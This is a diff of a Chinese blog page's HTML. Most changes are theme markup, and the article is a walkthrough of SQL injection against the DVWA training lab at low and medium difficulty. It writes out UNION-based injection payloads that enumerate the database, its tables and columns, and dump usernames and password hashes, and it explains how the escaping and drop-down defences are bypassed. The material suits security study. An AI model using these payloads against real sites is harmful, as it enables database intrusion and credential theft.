@@ -1,27 +1,21 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.9.0">
-    
 
-    
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
 
-    
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="huahua">
 
 
 
-    <meta charset="utf-8">
-    
-    
-    
-    
-    <title>DVWA-SQL_Injection(SQL注入) | 花花的blog | 厚积薄发</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="sql注入">
-    <meta name="description" content="DVWA里的SQL注入。">
+<meta name="description" content="DVWA里的SQL注入。">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DVWA-SQL_Injection(SQL注入)">
@@ -60,167 +54,299 @@
 <meta name="twitter:title" content="DVWA-SQL_Injection(SQL注入)">
 <meta name="twitter:description" content="DVWA里的SQL注入。">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/10/28/KgwPW6.png">
-    
-        <link rel="alternate" type="application/atom+xml" title="花花的blog" href="/atom.xml">
-    
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
 
-    <!-- custom head -->
-    
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
-</head>
 
+    <link rel="alternate" href="/atom.xml" title="花花的blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/avatar.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>DVWA-SQL_Injection(SQL注入) | 花花的blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
 <body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
         </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">huahua</h5>
-          <a href="mailto:1187100546@qq.com" title="1187100546@qq.com" class="mail">1187100546@qq.com</a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">huahua</a></h1>
         </hgroup>
+
+        
+        <p class="header-subtitle">厚积薄发</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="#" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS攻击/">XSS攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss攻击/">xss攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/作业/">作业</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/动漫/">动漫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/新闻/">新闻</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/暴力破解/">暴力破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/测试/">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻击/">渗透攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/记录/">记录</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">huahua</a></h1>
       </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                归档
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/tags"  >
-                <i class="icon icon-lg icon-tags"></i>
-                标签
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/categories"  >
-                <i class="icon icon-lg icon-th-list"></i>
-                分类
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://https://github.com/1187100546" target="_blank" >
-                <i class="icon icon-lg icon-github"></i>
-                Github
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/about"  >
-                <i class="icon icon-lg icon-link"></i>
-                关于
-              </a>
-            </li>
-        
-      </ul>
-    </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">DVWA-SQL_Injection(SQL注入)</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">huahua</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">厚积薄发</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="#" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">DVWA-SQL_Injection(SQL注入)</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-10-28T11:39:18.000Z" itemprop="datePublished" class="page-time">
-  2019-10-28
-</time>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-DVWA-SQL-Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/10/28/DVWA-SQL-Injection/" class="article-date">
+      <time datetime="2019-10-28T11:39:18.000Z" itemprop="datePublished">2019-10-28</time>
+</a>
 
 
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/sql注入/">sql注入</a></li></ul>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DVWA-SQL_Injection(SQL注入)
+    </h1>
+  
 
-            
-        </h5>
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/sql注入/">sql注入</a>
     </div>
 
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
     
-
-
-</header>
-
-
-<div class="container body-wrap">
-    
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#级别：low"><span class="post-toc-number">1.</span> <span class="post-toc-text">级别：low</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#查看源码"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">查看源码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析："><span class="post-toc-number">1.2.</span> <span class="post-toc-text">分析：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#判断是否存在注入，注入是字符型还是数字型"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜解SQL查询语句中的字段数"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">猜解SQL查询语句中的字段数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#确认显示的字段顺序"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">确认显示的字段顺序</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取当前数据库"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">获取当前数据库</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取数据库中的表"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">获取数据库中的表</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取表中的字段名"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">获取表中的字段名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#下载数据"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">下载数据</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#级别：medium"><span class="post-toc-number">2.</span> <span class="post-toc-text">级别：medium</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#判断是否存在注入，注入是字符型还是数字型-1"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜解SQL查询语句中的字段数-1"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">猜解SQL查询语句中的字段数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#确定显示的字段顺序"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">确定显示的字段顺序</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取当前数据库-1"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">获取当前数据库</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取数据库中的表-1"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">获取数据库中的表</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#获取表中的字段名-1"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">获取表中的字段名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#下载数据-1"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">下载数据</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#级别：high"><span class="post-toc-number">3.</span> <span class="post-toc-text">级别：high</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#SQL-Injection-Source"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">SQL Injection Source</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分析：-1"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">分析：</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">漏洞利用:</span></a></li></ol></li></ol>
-        </nav>
-    </aside>
-
-
-<article id="post-DVWA-SQL-Injection"
-  class="post-article article-type-post fade" itemprop="blogPost">
-
-    <div class="post-card">
-        <h1 class="post-card-title">DVWA-SQL_Injection(SQL注入)</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2019-10-28 19:39:18" datetime="2019-10-28T11:39:18.000Z"  itemprop="datePublished">2019-10-28</time>
-
-            
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/sql注入/">sql注入</a></li></ul>
-
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
-
-
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <p>DVWA里的SQL注入。</p>
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>DVWA里的SQL注入。</p>
 <a id="more"></a>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入分类</span><br><span class="line">按SQLMap中的分类来看，SQL注入类型有以下 5 种：</span><br><span class="line"> UNION query SQL injection（可联合查询注入） </span><br><span class="line"> Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line"> Boolean-based blind SQL injection（布尔型注入） </span><br><span class="line"> Error-based SQL injection（报错型注入）</span><br><span class="line"> Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>
@@ -239,537 +365,335 @@
 <li>… where user_id = “$id”   —-&gt;   … where user_id = “1” or “1024”=”1024”</li>
 </ul>
 <h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p><code>输入1，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/10/28/KgwPW6.png" alt="KgwPW6.png" title>
-                </div>
-                <div class="image-caption">KgwPW6.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/10/28/KgwPW6.png" alt="KgwPW6.png"></p>
 <p><code>输入1&#39;and &#39;1&#39; =&#39;2，查询失败，返回结果为空：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/10/28/KgwRt1.png" alt="KgwRt1.png" title>
-                </div>
-                <div class="image-caption">KgwRt1.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/10/28/KgwRt1.png" alt="KgwRt1.png"></p>
 <p><code>输入1&#39; or &#39;1&#39;=&#39;1 页面正常，并返回更多信息，成功查询</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/10/28/Kg0wEd.png" alt="Kg0wEd.png" title>
-                </div>
-                <div class="image-caption">Kg0wEd.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/10/28/Kg0wEd.png" alt="Kg0wEd.png"></p>
 <p><strong><code>判断存在的是字符型注入。</code></strong></p>
 <h4 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h4><p><code>输入1&#39; or 1=1 order by 1 #，查询成功： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/10/28/KgDOhR.png" alt="KgDOhR.png" title>
-                </div>
-                <div class="image-caption">KgDOhR.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/10/28/KgDOhR.png" alt="KgDOhR.png"></p>
 <p><code>输入1&#39; or 1=1 order by 2 #，查询成功： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/10/28/KgrhUH.png" alt="KgrhUH.png" title>
-                </div>
-                <div class="image-caption">KgrhUH.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/10/28/KgrhUH.png" alt="KgrhUH.png"></p>
 <p><code>输入1&#39; or 1=1 order by 3 #，查询失败： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/10/28/KgsUzt.png" alt="KgsUzt.png" title>
-                </div>
-                <div class="image-caption">KgsUzt.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/10/28/KgsUzt.png" alt="KgsUzt.png"></p>
 <p> <code>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</code></p>
 <h4 id="确认显示的字段顺序"><a href="#确认显示的字段顺序" class="headerlink" title="确认显示的字段顺序"></a>确认显示的字段顺序</h4><p> <code>输入1&#39; union select 1,2 #，查询成功： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MQK7Of.png" alt="MQK7Of.png" title>
-                </div>
-                <div class="image-caption">MQK7Of.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MQK7Of.png" alt="MQK7Of.png"></p>
 <p> 说明执行的SQL语句为select First name,Surname from 表 where ID=’id’… </p>
 <h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><p> <code>输入1&#39; union select 1,database() #，查询成功：#是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MQMl7D.png" alt="MQMl7D.png" title>
-                </div>
-                <div class="image-caption">MQMl7D.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MQMl7D.png" alt="MQMl7D.png"></p>
 <p> 说明当前的数据库为dvwa。 </p>
 <h4 id="获取数据库中的表"><a href="#获取数据库中的表" class="headerlink" title="获取数据库中的表"></a>获取数据库中的表</h4><p><code>输入1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MQM7C9.png" alt="MQM7C9.png" title>
-                </div>
-                <div class="image-caption">MQM7C9.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MQM7C9.png" alt="MQM7C9.png"></p>
 <p> 说明数据库dvwa中一共有两个表，guestbook与users。 </p>
 <h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><p><code>输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #，查询成功： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MQlbm6.png" alt="MQlbm6.png" title>
-                </div>
-                <div class="image-caption">MQlbm6.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MQlbm6.png" alt="MQlbm6.png"></p>
 <p>圈起来是是字段名</p>
 <h4 id="下载数据"><a href="#下载数据" class="headerlink" title="下载数据"></a>下载数据</h4><p><code>输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MQ1ncn.png" alt="MQ1ncn.png" title>
-                </div>
-                <div class="image-caption">MQ1ncn.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MQ1ncn.png" alt="MQ1ncn.png"></p>
 <p> 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 </p>
 <h3 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 </p>
 <p><img src="https://s2.ax1x.com/2019/11/11/MlYjiV.png" alt="MlYjiV.png"></p>
 <p> 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 </p>
 <h4 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a><strong>判断是否存在注入，注入是字符型还是数字型</strong></h4><p> <code>抓包更改参数id为1&#39; or 1=1 # 报错： #是注释作用</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlNW38.png" alt="MlNW38.png" title>
-                </div>
-                <div class="image-caption">MlNW38.png</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlNhjg.png" alt="MlNhjg.png" title>
-                </div>
-                <div class="image-caption">MlNhjg.png</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlNIBj.png" alt="MlNIBj.png" title>
-                </div>
-                <div class="image-caption">MlNIBj.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MlNW38.png" alt="MlNW38.png"></p>
+<p><img src="https://s2.ax1x.com/2019/11/11/MlNhjg.png" alt="MlNhjg.png"></p>
+<p><img src="https://s2.ax1x.com/2019/11/11/MlNIBj.png" alt="MlNIBj.png"></p>
 <p> <code>抓包更改参数id为1 or 1=1 #，查询成功：</code> </p>
 <p><img src="https://s2.ax1x.com/2019/11/11/MlUAgO.png" alt="MlUAgO.png"></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlUEvD.png" alt="MlUEvD.png" title>
-                </div>
-                <div class="image-caption">MlUEvD.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MlUEvD.png" alt="MlUEvD.png"></p>
 <p> <code>说明存在数字型注入。</code></p>
 <p> 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 </p>
 <h4 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a><strong>猜解SQL查询语句中的字段数</strong></h4><p><code>抓包更改参数id为1 order by 2 #，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlwIzV.png" alt="MlwIzV.png" title>
-                </div>
-                <div class="image-caption">MlwIzV.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MlwIzV.png" alt="MlwIzV.png"></p>
 <p><code>抓包更改参数id为1 order by 3 #，报错：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/MlwLdJ.png" alt="MlwLdJ.png" title>
-                </div>
-                <div class="image-caption">MlwLdJ.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/MlwLdJ.png" alt="MlwLdJ.png"></p>
 <p><code>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</code></p>
 <h4 id="确定显示的字段顺序"><a href="#确定显示的字段顺序" class="headerlink" title="确定显示的字段顺序"></a><strong>确定显示的字段顺序</strong></h4><p> <code>抓包更改参数id为1 union select 1,2 #，查询成功：</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://s2.ax1x.com/2019/11/11/Ml0JWq.png" alt="Ml0JWq.png" title>
-                </div>
-                <div class="image-caption">Ml0JWq.png</div>
-            </figure>
-
+<p><img src="https://s2.ax1x.com/2019/11/11/Ml0JWq.png" alt="Ml0JWq.png"></p>
 <p> 说明执行的SQL语句为select First name,Surname from 表 where ID=id… </p>
